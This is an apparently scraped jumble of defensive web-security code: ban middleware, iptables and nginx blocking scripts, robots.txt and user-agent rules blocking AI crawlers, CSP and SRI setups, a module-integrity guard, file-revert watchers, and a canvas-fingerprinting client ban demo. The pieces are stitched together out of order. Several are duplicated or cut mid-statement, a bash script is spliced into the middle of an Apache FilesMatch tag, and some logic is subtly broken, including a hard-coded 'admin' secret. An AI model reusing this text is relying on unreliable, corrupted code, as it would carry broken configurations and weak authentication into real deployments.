      const asn = req.get('x-forwarded-asn') || null;
      const tlsJa3 = req.get('x-ja3') || null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null,
        fingerprint ? isBanned('fingerprint', fingerprint) : null,
        asn ? isBanned('asn', asn) : null,
        tlsJa3 ? isBanned('tls_ja3', tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // signal edge to escalate (best-effort)
          if (opts.edge && opts.edge.notify) opts.edge.notify({ type: ban.subject_type, value: ban.subject_value, reason: ban.reason });
          req.app.logger?.warn({ event: 'ban_block', ip, apiKey, accountId, fingerprint, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      next();
    } catch (err) { next(err); }
  };
};
// edge-adapter.js (generic)
async function pushIpBlockToEdge(providerClient, ip, meta = {}) {
  // providerClient is a pluggable SDK for Cloudflare/AWS/GCP/etc.
  // Implement idempotent upsert: create or update an IP set entry and return ruleId for revocation.
  const ruleId = await providerClient.upsertIpSet({ ip, meta });
  return ruleId;
}

async function removeIpBlockFromEdge(providerClient, ruleId) {
  await providerClient.removeIpSetEntry(ruleId);
}

module.exports = { pushIpBlockToEdge, removeIpBlockFromEdge };
map $http_x_suspicious $to_honeypot {
  default 0;
  "1" 1;
}

server {
  listen 80;
  server_name example.com;

  location / {
    proxy_pass http://app_upstream;
  }

  location /honeypot/ {
    proxy_pass http://honeypot_upstream;
  }

  # conditional routing: if app sets header X-Suspicious: 1, rewrite to honeypot
  proxy_intercept_errors on;
  error_page 418 = @to_honeypot;
}

# In app: respond with 418 and header X-Suspicious when you want the edge to divert
// correlate-worker.js (concept)
const db = require('./db');

async function correlateRecentLogs() {
  // 1) fetch recent request logs with labels (ip, fingerprint, api_key, account)
  // 2) group by co-occurrence within short time windows
  // 3) upsert actor_links(actor_id, label_type, label_value)
  // 4) merge actor_ids that share labels and mark linked labels as suspicious
  // 5) create temporary bans for linked labels if confidence threshold reached
}
setInterval(correlateRecentLogs, 60_000);
<div id="app"></div>
# robots.txt — block common AI crawlers (example)
User-agent: GPTBot
Disallow: /

User-agent: ClaudeBot
Disallow: /

User-agent: PerplexityBot
Disallow: /

User-agent: Copilot
Disallow: /

# Allow normal search engines if desired (example)
User-agent: Googlebot
Allow: /

User-agent: *
Disallow:
location ~* \.(pdf|jpg|jpeg|png|gif|json)$ {
    add_header X-Robots-Tag "noindex, nofollow";
}
<FilesMatch "\.(pdf|jpg|png|json)$">
  Header set X-Robots-Tag "noindex, nofollow"
</FilesMatch>
/* canonical.css — canonical baseline styles */
:root {
  --brand-bg: #0b5cff;
  --brand-text: #ffffff;
  --body-font: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
}

html, body {
  height: 100%;
  margin: 0;
  font-family: var(--body-font);
  background: var(--brand-bg);
  color: var(--brand-text);
}

/* important rules to reduce accidental overrides */
* {
  box-sizing: border-box;
}

/* use !important sparingly to resist inline overrides */
header, main, footer {
  background: transparent !important;
  color: inherit !important;
}
<link id="canonical-stylesheet" rel="stylesheet" href="/css/canonical.css">

#!/usr/bin/env bash
# check-and-revert.sh — run on the server where site files are deployed
REPO_DIR="/var/www/site"
FILE="robots.txt"
cd "$REPO_DIR" || exit 1

# Fetch latest from origin (optional)
git fetch --all --quiet

# Compare deployed file to repo HEAD
if ! git diff --quiet HEAD -- "$FILE"; then
  # Revert the file to the committed version
  git checkout -- "$FILE"
  # Optionally log and notify
  echo "$(date -u) Reverted $FILE to HEAD" >> /var/log/site-reverts.log
fi
# robots.txt — example tailored to common AI crawlers
# OpenAI / GPT
User-agent: GPTBot
Disallow: /

User-agent: OAI-SearchBot
Disallow: /

# Anthropic / Claude family (training vs search may be separate)
User-agent: ClaudeBot
Disallow: /

User-agent: Claude-SearchBot
Disallow: /

User-agent: Claude-User
Disallow: /

# Perplexity
User-agent: PerplexityBot
Disallow: /

User-agent: Perplexity-User
Disallow: /

# GitHub Copilot (agentic features are separate; block generic Copilot fetchers)
User-agent: Copilot
Disallow: /

# Default: allow major search engines if you want them to index
User-agent: Googlebot
Allow: /

User-agent: *
Disallow:
SetEnvIfNoCase User-Agent "GPTBot" bad_bot
SetEnvIfNoCase User-Agent "ClaudeBot" bad_bot
SetEnvIfNoCase User-Agent "PerplexityBot" bad_bot
SetEnvIfNoCase User-Agent "Copilot" bad_bot

<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{ENV:bad_bot} =1
  RewriteRule .* - [F]
</IfModule>

<FilesMatch "\.(pdf|jpg|png|json)$">
  Header set X-Robots-Tag "noindex, nofollow"
</File#!/usr/bin/env bash
# /usr/local/bin/check-and-revert.sh
REPO_DIR="/var/www/site"
FILES=("robots.txt" "css/canonical.css")
LOG="/var/log/site-reverts.log"
cd "$REPO_DIR" || exit 1
git fetch --all --quiet

for f in "${FILES[@]}"; do
  if ! git diff --quiet HEAD -- "$f"; then
    DIFF=$(git --no-pager diff -- "$f")
    git checkout -- "$f"
    echo "$(date -u) Reverted $f. Diff: $DIFF" >> "$LOG"
    # send alert (example using logger; replace with your alerting)
    logger -t site-revert "Reverted $f; see $LOG"
  fi
done
sMatch>
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-<RANDOM_NONCE>' https://trusted.cdn.example;
  style-src 'self' https://trusted.cdn.example 'unsafe-inline' ;
  connect-src 'self';
  img-src 'self' data:;
  frame-ancestors 'none';
  base-uri 'self';
  object-src 'none';
  upgrade-insecure-requests;
  report-uri /csp-report-endpoint

<link rel="stylesheet" href="https://trusted.cdn.example/app.css"
      integrity="sha384-BASE64HASH" crossorigin="anonymous">
<script src="https://trusted.cdn.example/app.js"
        integrity="sha384-BASE64HASH" crossorigin="anonymous" nonce="abc123"></script>

<iframe src="/trusted-widget" sandbox="allow-scripts allow-same-origin" referrerpolicy="no-referrer"></iframe>

  <!-- Meta-CSP (meta is weaker than header but usable in JSFiddle) -->

  <!-- Canonical CSS (small, inline for demo; in production use SRI + external file) -->

  <header>
    <strong>Client Integrity Demo</strong>
    <span class="notice" id="status">All systems nominal</span>
  </header>

  <main>
    <p>This page demonstrates client-side checks: module hash verification, script whitelisting, Trusted Types, MutationObserver self-heal, and a sandboxed iframe pattern.</p>

    <button id="load-widget">Load Widget Module Safely</button>
    <div id="widget-area" aria-live="polite"></div>

    <h3>Sandboxed iframe (untrusted code)</h3>
    <iframe id="sandbox" sandbox="allow-scripts" srcdoc="<p>Sandbox ready</p>"></iframe>
  </main>

  <main>
    <h1>Hypothetical Client Ban Demo</h1>
    <p>Use the controls below to simulate adding this browser to a local banlist and see enforcement.</p>

    <div>
      <button id="ban-me">Ban this client (local)</button>
      <button id="clear-ban">Clear local ban</button>
    </div>

    <div class="admin">
      <label>Admin secret (demo): <input id="admin-secret" type="password" placeholder="admin"></label>
      <button id="admin-ban">Admin ban (local + attempt SW)</button>
    </div>

    <div class="log" id="log"></div>
  </main>

  <div id="ban-overlay" role="alert" aria-live="assertive">
    <div class="box">
      <h2>Access Restricted</h2>
      <p>Your client has been restricted from using this site. Contact the site administrator if you believe this is an error.</p>
      <p style="margin-top:1rem"><button id="appeal">Request review</button></p>
    </div>
  </div>
  CREATE TABLE bans (
  id SERIAL PRIMARY KEY,
  subject_type TEXT NOT NULL, -- 'ip' | 'account' | 'api_key' | 'fingerprint'
  subject_value TEXT NOT NULL,
  reason TEXT,
  created_by TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT now(),
  expires_at TIMESTAMP WITH TIME ZONE NULL,
  active BOOLEAN DEFAULT true
);
CREATE INDEX ON bans(subject_type, subject_value);
body {
  background: #20262E;
  padding: 20px;
  font-family: Helvetica;
}

#app {
  background: #fff;
  border-radius: 4px;
  padding: 20px;
  transition: all 0.2s;
  text-align: center;
}
:root {
  --brand-bg: #0b5cff;
  --brand-text: #fff;
}
body { background: var(--brand-bg) !important; color: var(--brand-text) !important; }
:root { --bg: #0b5cff; --fg: #ffffff; --accent: #ffd166; }
    html,body { height:100%; margin:0; font-family:system-ui,Segoe UI,Roboto,Arial; background:var(--bg); color:var(--fg); }
    header { padding:1rem; background:rgba(0,0,0,0.08); }
    main { padding:1rem; }
    .notice { background:var(--accent); color:#000; padding:.5rem; border-radius:6px; display:inline-block; }
    /* critical rules reasserted with !important to resist casual overrides */
    body { background:var(--bg) !important; color:var(--fg) !important; }:root { --bg:#0b5cff; --fg:#fff; --warn:#ffcc00; }
    html,body{height:100%;margin:0;font-family:system-ui,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--fg)}
    main{padding:1rem}
    #ban-overlay{
      position:fixed;inset:0;display:none;align-items:center;justify-content:center;
      background:rgba(0,0,0,0.85);z-index:99999;color:#fff;padding:2rem;text-align:center;
    }
    #ban-overlay .box{max-width:720px}
    button{padding:.5rem 1rem;border-radius:6px;border:0;background:#fff;color:#000;cursor:pointer}
    .admin { margin-top:1rem; }
    .log { margin-top:1rem; font-size:0.9rem; color:#fff; opacity:0.9 }
    limit_req_zone $binary_remote_addr zone=rl:10m rate=10r/s;

server {
  listen 80;
  server_name example.com;

  limit_req zone=rl burst=20 nodelay;

  if ($http_x_blocked_by_app = "1") {
    return 403;
  }

  location / {
    proxy_pass http://app_upstream;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
  }
}
#!/usr/bin/env bash
# block-ip.sh — defensive script to add iptables drop and nginx include
IP="$1"
NGINX_BLOCK_FILE="/etc/nginx/conf.d/blocked_ips.conf"
LOG="/var/log/edge-blocks.log"

if [[ -z "$IP" ]]; then
  echo "Usage: $0 <ip>"
  exit 1
fi

# idempotent iptables insert (check first)
if ! iptables -C INPUT -s "$IP" -j DROP 2>/dev/null; then
  iptables -I INPUT -s "$IP" -j DROP
  echo "$(date -u) iptables DROP added for $IP" >> "$LOG"
fi

# add to nginx include (idempotent)
grep -q "$IP" "$NGINX_BLOCK_FILE" 2>/dev/null || echo "deny $IP;" >> "$NGINX_BLOCK_FILE" && echo "$(date -u) nginx deny added for $IP" >> "$LOG"

# reload nginx safely
nginx -t && systemctl reload nginx
#!/usr/bin/env bash
IP="$1"
NGINX_BLOCK_FILE="/etc/nginx/conf.d/blocked_ips.conf"
LOG="/var/log/edge-blocks.log"

iptables -D INPUT -s "$IP" -j DROP 2>/dev/null && echo "$(date -u) iptables DROP removed for $IP" >> "$LOG"
sed -i "\|deny $IP;|d" "$NGINX_BLOCK_FILE" && echo "$(date -u) nginx deny removed for $IP" >> "$LOG"
nginx -t && systemctl reload nginx
# run after unit tests
node tests/test_quarantine_flow.js || { echo "Quarantine flow failed"; exit 1; }
# ci-verify-modules.sh (run in CI)
set -e
ALLOWLIST="ci/allowlist.txt"
for f in dist/modules/*.js; do
  bn=$(basename "$f")
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
  openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}' > "dist/modules/$bn.sri"
done
# ci-verify-modules.sh
set -e
ALLOWLIST="ci/allowlist.txt"
for f in dist/modules/*.js; do
  bn=$(basename "$f")
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
  openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}' > "dist/modules/$bn.sri"
done
# ci-sri.sh (run in CI)
set -e
ASSETS_DIR=dist/modules
ALLOWLIST=ci/allowlist.txt
for f in "$ASSETS_DIR"/*.js; do
  bn=$(basename "$f")
  sri=$(openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}')
  echo "$bn $sri" >> dist/modules/sri-manifest.txt
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
done
# inject sri-manifest.txt into deployment artifacts and templates
# ci-sri.sh (run in CI)
set -e
ASSETS_DIR=dist/modules
ALLOWLIST=ci/allowlist.txt
for f in "$ASSETS_DIR"/*.js; do
  bn=$(basename "$f")
  sri=$(openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}')
  echo "$bn $sri" >> dist/modules/sri-manifest.txt
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
done
# inject sri-manifest.txt into deployment artifacts and templates
interface Person {
  firstName: string;
  lastName:  string;
}

function greeter(person: Person) {
  return "Hello, " + person.firstName + " " + person.lastName;
}

let user = {
	firstName: "Malcolm",
  lastName:  "Reynolds"
};

document.querySelector("#app").innerHTML = greeter(user);
// Express middleware: block known AI crawler user agents
const blockedAgents = [
  /GPTBot/i,
  /ClaudeBot/i,
  /PerplexityBot/i,
  /Copilot/i
];

function blockAICrawlers(req, res, next) {
  const ua = req.get('User-Agent') || '';
  if (blockedAgents.some(re => re.test(ua))) {
    return res.status(403).send('Access denied');
  }
  next();
}

// Usage
const express = require('express');
const app = express();
app.use(blockAICrawlers);
// block-ai-crawlers.js
const fs = require('fs');
const blockedRegexes = [
  /GPTBot/i,
  /OAI-SearchBot/i,
  /ClaudeBot/i,
  /Claude-SearchBot/i,
  /Claude-User/i,
  /PerplexityBot/i,
  /Perplexity-User/i,
  /Copilot/i
];

function blockAICrawlers(req, res, next) {
  const ua = req.get('User-Agent') || '';
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const asn = req.get('X-Forwarded-ASN') || 'unknown';
  if (blockedRegexes.some(re => re.test(ua))) {
    const entry = `${new Date().toISOString()} BLOCKED UA="${ua}" PATH="${req.path}" IP=${ip} ASN=${asn}\n`;
    fs.appendFile('/var/log/ai-blocks.log', entry, () => {});
    return res.status(403).send('Access denied');
  }
  next();
}

module.exports = blockAICrawlers;
# block by UA (simple)
map $http_user_agent $block_ai {
    default 0;
    "~*GPTBot" 1;
    "~*OAI-SearchBot" 1;
    "~*ClaudeBot" 1;
    "~*PerplexityBot" 1;
    "~*Copilot" 1;
}

server {
    listen 80;
    server_name example.com;

    if ($block_ai) {
        return 403;
    }

    location ~* \.(pdf|jpg|jpeg|png|gif|json)$ {
        add_header X-Robots-Tag "noindex, nofollow";
    }

    # normal site config...
}
// module-guard.js — run this very early (e.g., node -r ./module-guard.js app.js)
const fs = require('fs');
const crypto = require('crypto');
const Module = require('module');
const path = require('path');

const ALLOWED_HASHES = {
  // relative path -> expected sha256 hex
  // "node_modules/some-package/index.js": "abc123..."
};

// compute file hash
function sha256File(filePath) {
  const data = fs.readFileSync(filePath);
  return crypto.createHash('sha256').update(data).digest('hex');
}

// resolve and verify before loading
const originalLoad = Module._load;
Module._load = function(request, parent, isMain) {
  try {
    const resolved = Module._resolveFilename(request, parent, isMain);
    // only verify local files (skip core modules)
    if (resolved && !resolved.startsWith('node:') && !path.isAbsolute(resolved) === false) {
      const rel = path.relative(process.cwd(), resolved);
      if (ALLOWED_HASHES[rel]) {
        const h = sha256File(resolved);
        if (h !== ALLOWED_HASHES[rel]) {
          throw new Error(`Module integrity check failed for ${rel}`);
        }
      } else {
        throw new Error(`Module ${rel} is not in allowlist`);
      }
    }
  } catch (err) {
    // log and fail fast
    console.error(`[module-guard] blocked module: ${err.message}`);
    const e = new Error('Access to requested module denied');
    e.code = 'MODULE_BLOCKED';
    throw e;
  }
  return originalLoad.apply(this, arguments);
};
#!/usr/bin/env bash
WATCH_DIR="/var/www/site"
FILES=("robots.txt" "css/canonical.css" "node_modules")
LOG="/var/log/integrity-monitor.log"

inotifywait -m -r -e modify,create,delete --format '%w%f %e' "$WATCH_DIR" | while read file event; do
  echo "$(date -u) CHANGE $file $event" >> "$LOG"
  cd "$WATCH_DIR" || continue
  # conservative: only revert tracked files
  if git ls-files --error-unmatch "$file" >/dev/null 2>&1; then
    git checkout -- "$file"
    echo "$(date -u) Reverted $file" >> "$LOG"
    # send alert (replace with your alerting)
    logger -t integrity-monitor "Reverted $file; see $LOG"
  fi
done
const ALLOWED_SCRIPTS = new Set([
  location.origin + '/app.bundle.js',
  'https://trusted.cdn.example/lib.js'
]);

function isAllowedNode(node) {
  if (node.tagName === 'SCRIPT' && node.src) {
    return ALLOWED_SCRIPTS.has(node.src);
  }
  if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
    return true; // optionally check allowlist for styles
  }
  return false;
}

const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !isAllowedNode(n)) {
        n.remove();
        console.warn('Removed unauthorized node', n);
      }
    }
  }
});

observer.observe(document.documentElement, { childList: true, subtree: true });

// Reapply canonical stylesheet if it is removed or its href changes
(function() {
  const canonicalId = 'canonical-stylesheet';
  const canonicalHref = '/css/canonical.css';

  function ensureStylesheet() {
    let link = document.getElementById(canonicalId);
    if (!link) {
      link = document.createElement('link');
      link.id = canonicalId;
      link.rel = 'stylesheet';
      link.href = canonicalHref;
      document.head.appendChild(link);
      return;
    }
    if (link.href.indexOf(canonicalHref) === -1) {
      link.href = canonicalHref;
    }
  }

  // Watch for head mutations that remove or alter the stylesheet
  const observer = new MutationObserver(mutations => {
    for (const m of mutations) {
      if (m.type === 'childList' || m.type === 'attributes') {
        ensureStylesheet();
      }
    }
  });

  observer.observe(document.head, { childList: true, subtree: true, attributes: true, attributeFilter: ['href', 'rel', 'id'] });

  // Also run once on load
  ensureStylesheet();
})();

if (window.trustedTypes) {
  window.trustedTypes.createPolicy('default', {
    createHTML: (s) => { throw new Error('createHTML blocked'); },
    createScript: (s) => { throw new Error('createScript blocked'); },
    createScriptURL: (s) => { throw new Error('createScriptURL blocked'); }
  });
}

const ALLOWED_HASHES = {
  '/modules/widget-v1.js': 'sha256-EXPECTED_BASE64_HASH'
};

async function loadModuleSafely(url) {
  const resp = await fetch(url, { credentials: 'same-origin' });
  if (!resp.ok) throw new Error('Fetch failed');
  const buf = await resp.arrayBuffer();
  const hashBuf = await crypto.subtle.digest('SHA-256', buf);
  const hashBase64 = btoa(String.fromCharCode(...new Uint8Array(hashBuf)));
  const computed = 'sha256-' + hashBase64;
  if (ALLOWED_HASHES[url] !== computed) throw new Error('Integrity mismatch');
  const blob = new Blob([buf], { type: 'application/javascript' });
  const blobUrl = URL.createObjectURL(blob);
  const script = document.createElement('script');
  script.type = 'module';
  script.src = blobUrl;
  document.head.appendChild(script);
  // revoke after load to reduce memory
  script.onload = () => URL.revokeObjectURL(blobUrl);
}

// Usage
loadModuleSafely('/modules/widget-v1.js').catch(e => {
  console.error('Blocked module load:', e);
});

const ALLOWED_SCRIPTS = new Set([
  location.origin + '/app.bundle.js',
  'https://trusted.cdn.example/lib.js'
]);

function isAllowedNode(node) {
  if (node.tagName === 'SCRIPT' && node.src) {
    return ALLOWED_SCRIPTS.has(node.src);
  }
  if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
    return true; // optionally check allowlist for styles
  }
  return false;
}

const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !isAllowedNode(n)) {
        n.remove();
        console.warn('Removed unauthorized node', n);
      }
    }
  }
});

observer.observe(document.documentElement, { childList: true, subtree: true });

/* ===== Trusted Types policy (blocks unsafe sinks unless explicitly allowed) ===== */
  if (window.trustedTypes) {
    try {
      window.trustedTypes.createPolicy('safePolicy', {
        createHTML: (s) => { throw new Error('createHTML blocked'); },
        createScript: (s) => { throw new Error('createScript blocked'); },
        createScriptURL: (s) => { throw new Error('createScriptURL blocked'); }
      });
    } catch (e) {
      console.warn('TrustedTypes policy creation failed or already exists.');
    }
  }

  /* ===== Allowlist of module URLs and expected SHA-256 (base64) =====
     In production, populate this map from CI (compute hashes at build time).
     Format: 'url': 'sha256-BASE64'
  */
  const ALLOWED_MODULES = {
    '/modules/widget-v1.js': 'sha256-REPLACE_WITH_BASE64_HASH'
  };

  /* Utility: compute base64 SHA-256 of ArrayBuffer */
  async function sha256Base64(buffer) {
    const hash = await crypto.subtle.digest('SHA-256', buffer);
    const bytes = new Uint8Array(hash);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
  }

  /* ===== Safe dynamic module loader: fetch -> verify -> execute as module ===== */
  async function loadModuleSafely(url) {
    try {
      if (!ALLOWED_MODULES[url]) throw new Error('Module not allowlisted');
      const resp = await fetch(url, { credentials: 'same-origin' });
      if (!resp.ok) throw new Error('Fetch failed: ' + resp.status);
      const buf = await resp.arrayBuffer();
      const base64 = await sha256Base64(buf);
      const computed = 'sha256-' + base64;
      if (computed !== ALLOWED_MODULES[url]) throw new Error('Integrity mismatch');
      const blob = new Blob([buf], { type: 'application/javascript' });
      const blobUrl = URL.createObjectURL(blob);
      const script = document.createElement('script');
      script.type = 'module';
      script.src = blobUrl;
      document.head.appendChild(script);
      script.onload = () => {
        URL.revokeObjectURL(blobUrl);
        console.info('Module loaded safely:', url);
      };
      script.onerror = (e) => {
        URL.revokeObjectURL(blobUrl);
        console.error('Module execution failed', e);
      };
    } catch (err) {
      console.error('Blocked module load:', err);
      document.getElementById('status').textContent = 'Module blocked: ' + err.message;
    }
  }

  document.getElementById('load-widget').addEventListener('click', () => {
    loadModuleSafely('/modules/widget-v1.js');
  });

  /* ===== MutationObserver: remove unauthorized <script> and <link> nodes ===== */
  const ALLOWED_SCRIPT_SRCS = new Set([
    location.origin + '/app.bundle.js',
    'https://trusted.cdn.example/lib.js'
  ]);

  function nodeIsAllowed(node) {
    if (node.tagName === 'SCRIPT' && node.src) {
      return ALLOWED_SCRIPT_SRCS.has(node.src);
    }
    if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
      // allow styles from same origin or trusted CDN (adjust as needed)
      return node.href.startsWith(location.origin) || node.href.includes('trusted.cdn.example');
    }
    return true;
  }

  const observer = new MutationObserver(muts => {
    for (const m of muts) {
      for (const n of m.addedNodes) {
        if (n.nodeType !== 1) continue;
        if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !nodeIsAllowed(n)) {
          console.warn('Removed unauthorized node', n);
          n.remove();
          document.getElementById('status').textContent = 'Removed unauthorized resource';
        }
      }
    }
  });

  observer.observe(document.documentElement, { childList: true, subtree: true });

  /* ===== Simple integrity canary and periodic self-check ===== */
  function checkCanonicalStyle() {
    const style = document.getElementById('canonical-style');
    if (!style) {
      // reinsert minimal critical style if removed
      const s = document.createElement('style');
      s.id = 'canonical-style';
      s.textContent = ':root{--bg:#0b5cff;--fg:#fff}body{background:var(--bg)!important;color:var(--fg)!important}';
      document.head.appendChild(s);
      document.getElementById('status').textContent = 'Reapplied critical styles';
      console.warn('Reapplied canonical style');
    }
  }
  setInterval(checkCanonicalStyle, 5000);

  /* ===== Sandboxed iframe communication (postMessage with validation) ===== */
  const iframe = document.getElementById('sandbox');
  iframe.addEventListener('load', () => {
    // send a short-lived token or init message
    iframe.contentWindow.postMessage({ cmd: 'init', nonce: 'short-lived-token' }, '*');
  });

  window.addEventListener('message', e => {
    if (e.source !== iframe.contentWindow) return;
    // Strictly validate message shape and origin if using src instead of srcdoc
    const data = e.data;
    if (data && data.type === 'pong' && data.nonce === 'short-lived-token') {
      console.info('Sandbox responded correctly');
    } else {
      console.warn('Unexpected message from sandbox', data);
    }
  });

  /* ===== Minimal logging endpoint (demo: console only). Replace with secure server endpoint in production. ===== */
  function logEvent(level, msg) {
    console[level](msg);
    // Example: send to /log endpoint with fetch (ensure CORS and auth)
    // fetch('/log', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({level,msg,t:Date.now()}) });
  }

  // Expose for debugging in demo
  window.__demo = { loadModuleSafely, ALLOWED_MODULES, logEvent };/* ===== Simple fingerprint (userAgent + platform + timezone + canvas hash) ===== */
async function canvasHash() {
  try {
    const c = document.createElement('canvas');
    c.width = 200; c.height = 50;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '16px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 200, 50);
    ctx.fillStyle = '#069';
    ctx.fillText('fingerprint-demo-'+navigator.userAgent, 2, 2);
    const data = c.toDataURL();
    const b = atob(data.split(',')[1]);
    const arr = new Uint8Array(b.length);
    for (let i=0;i<b.length;i++) arr[i]=b.charCodeAt(i);
    const hashBuf = await crypto.subtle.digest('SHA-256', arr);
    const hashArray = Array.from(new Uint8Array(hashBuf));
    return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
  } catch (e) {
    return 'no-canvas';
  }
}

async function computeFingerprint() {
  const ua = navigator.userAgent || 'unknown';
  const platform = navigator.platform || 'unknown';
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
  const ch = await canvasHash();
  const raw = `${ua}|${platform}|${tz}|${ch}`;
  const enc = new TextEncoder().encode(raw);
  const hashBuf = await crypto.subtle.digest('SHA-256', enc);
  const hashArray = Array.from(new Uint8Array(hashBuf));
  return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
}

/* ===== Local banlist storage helpers ===== */
const BAN_KEY = 'local_banlist_v1';
function readBanlist() {
  try {
    const raw = localStorage.getItem(BAN_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch (e) { return []; }
}
function writeBanlist(list) {
  localStorage.setItem(BAN_KEY, JSON.stringify(list));
}

/* ===== Enforcement: overlay + event blocking ===== */
function showBanOverlay() {
  const ov = document.getElementById('ban-overlay');
  ov.style.display = 'flex';
  // block pointer events on body
  document.body.style.pointerEvents = 'none';
  ov.style.pointerEvents = 'auto';
}
function hideBanOverlay() {
  const ov = document.getElementById('ban-overlay');
  ov.style.display = 'none';
  document.body.style.pointerEvents = '';
}

/* Prevent common interactions when banned */
function attachGlobalBlockers() {
  function stop(e){ e.stopImmediatePropagation(); e.preventDefault(); }
  ['click','keydown','submit','pointerdown','contextmenu'].forEach(ev => {
    window.addEventListener(ev, stop, true);
  });
}

/* ===== Ban management ===== */
async function isCurrentBanned() {
  const fp = await computeFingerprint();
  const list = readBanlist();
  return list.includes(fp);
}
async function addCurrentToBanlist() {
  const fp = await computeFingerprint();
  const list = readBanlist();
  if (!list.includes(fp)) {
    list.push(fp);
    writeBanlist(list);
    // set cookie for extra persistence (expires 1 year)
    document.cookie = `site_banned=1; max-age=${60*60*24*365}; path=/; SameSite=Lax`;
    log('Added fingerprint to local banlist: ' + fp.slice(0,12) + '...');
  }
  enforceIfBanned();
}
function clearLocalBanlist() {
  writeBanlist([]);
  document.cookie = 'site_banned=; max-age=0; path=/';
  log('Cleared local banlist');
  hideBanOverlay();
}

/* ===== Attempt to register a service worker and pass ban info (works only on HTTPS/origin) ===== */
async function tryRegisterSWAndSetBan() {
  if (!('serviceWorker' in navigator)) {
    log('Service worker not supported in this environment');
    return;
  }
  try {
    // In a real deployment, /sw.js should be served from your origin and implement fetch blocking.
    const reg = await navigator.serviceWorker.register('/sw.js').catch(()=>null);
    if (!reg) { log('SW registration failed or blocked'); return; }
    const fp = await computeFingerprint();
    // send message to SW to store ban (SW must implement message handler)
    if (reg.active) {
      reg.active.postMessage({ type: 'SET_BAN', fingerprint: fp });
      log('Requested SW to set ban for fingerprint');
    } else {
      log('SW registered but not active yet');
    }
  } catch (e) {
    log('SW error: ' + e.message);
  }
}

/* ===== Enforcement check on load and periodic re-check ===== */
async function enforceIfBanned() {
  const banned = await isCurrentBanned();
  if (banned || document.cookie.includes('site_banned=1')) {
    showBanOverlay();
    attachGlobalBlockers();
    log('Client is restricted locally');
  } else {
    hideBanOverlay();
    log('Client not restricted');
  }
}

/* ===== Simple logging helper (demo only) ===== */
function log(msg) {
  const el = document.getElementById('log');
  const t = new Date().toISOString();
  el.textContent = `[${t}] ${msg}\n` + el.textContent;
  console.log(msg);
}

/* ===== UI wiring ===== */
document.getElementById('ban-me').addEventListener('click', () => {
  addCurrentToBanlist();
});
document.getElementById('clear-ban').addEventListener('click', () => {
  clearLocalBanlist();
});
document.getElementById('appeal').addEventListener('click', () => {
  alert('Appeal request recorded (demo). In production, send to server for review.');
});

/* Admin ban button (demo: requires matching secret) */
document.getElementById('admin-ban').addEventListener('click', async () => {
  const secret = document.getElementById('admin-secret').value || '';
  const adminSecret = 'admin'; // demo secret; replace with secure server-side auth
  if (secret !== adminSecret) { alert('Invalid admin secret'); return; }
  await addCurrentToBanlist();
  await tryRegisterSWAndSetBan();
});

/* Run initial enforcement and periodic checks */
enforceIfBanned();
setInterval(enforceIfBanned, 10_000); // re-check every 10s

/* Expose functions for debugging in console */
window.__banDemo = { computeFingerprint, addCurrentToBanlist, clearLocalBanlist, readBanlist };
// ban-middleware.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query('SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true', [type, value]);
  if (res.rowCount) {
    const ban = res.rows[0];
    const ttl = ban.expires_at ? Math.max(0, new Date(ban.expires_at) - Date.now()) : null;
    if (ttl) await redis.setEx(key, Math.ceil(ttl/1000), JSON.stringify(ban));
    else await redis.set(key, JSON.stringify(ban));
    return ban;
  }
  return null;
}

module.exports = function banMiddleware() {
  return async function (req, res, next) {
    try {
      const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;

      const checks = [
        isBanned('ip', ip),
